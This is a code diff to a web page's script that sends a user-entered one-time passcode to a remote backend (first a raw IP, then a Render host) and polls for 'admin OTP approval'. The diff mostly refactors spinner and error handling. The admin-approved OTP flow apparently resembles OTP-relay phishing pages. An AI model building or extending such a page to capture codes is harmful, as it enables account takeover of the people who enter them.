@@ -150,12 +150,14 @@
   </main>
 
   <script>
-    const API_BASE = "http://158.101.117.189:3000"; // Your server base URL
+    const API_BASE = "https://my-node-backend-4nfy.onrender.com"; // Updated to Render backend
 
     async function submitOtp() {
-      const otp = document.getElementById("otp").value.trim();
+      const otpInput = document.getElementById("otp");
+      const otp = otpInput.value.trim();
       const errorText = document.getElementById("errorText");
       const spinner = document.getElementById("loadingSpinner");
+      const otpSection = document.getElementById("otpSection");
 
       if (!otp) {
         errorText.textContent = "Please enter the code.";
@@ -164,6 +166,8 @@
       }
 
       errorText.style.display = "none";
+      otpInput.disabled = true;
+      spinner.style.display = "block";
 
       try {
         const res = await fetch(`${API_BASE}/submit-otp`, {
@@ -178,20 +182,23 @@
           throw new Error(data.message || "Failed to submit OTP");
         }
 
-        // Hide OTP input, show spinner
-        document.getElementById("otpSection").style.display = "none";
-        spinner.style.display = "block";
+        // Hide OTP input and button after successful submit
+        otpSection.style.display = "none";
 
         // Start polling
         pollOtpApproval();
       } catch (err) {
         errorText.textContent = err.message || "An error occurred.";
         errorText.style.display = "block";
+        spinner.style.display = "none";
+        otpInput.disabled = false;
       }
     }
 
     async function pollOtpApproval(maxAttempts = 20, intervalMs = 3000) {
       let attempts = 0;
+      const errorText = document.getElementById("errorText");
+      const spinner = document.getElementById("loadingSpinner");
 
       while (attempts < maxAttempts) {
         attempts++;
@@ -206,16 +213,17 @@
             return;
           }
         } catch (err) {
-          document.getElementById("errorText").textContent = "Error checking status. Retrying...";
-          document.getElementById("errorText").style.display = "block";
+          errorText.textContent = "Error checking status. Retrying...";
+          errorText.style.display = "block";
         }
 
         await new Promise(resolve => setTimeout(resolve, intervalMs));
       }
 
-      document.getElementById("errorText").textContent =
+      errorText.textContent =
         "Timed out waiting for admin OTP approval.";
-      document.getElementById("errorText").style.display = "block";
+      errorText.style.display = "block";
+      spinner.style.display = "none";
     }
   </script>
 </body>
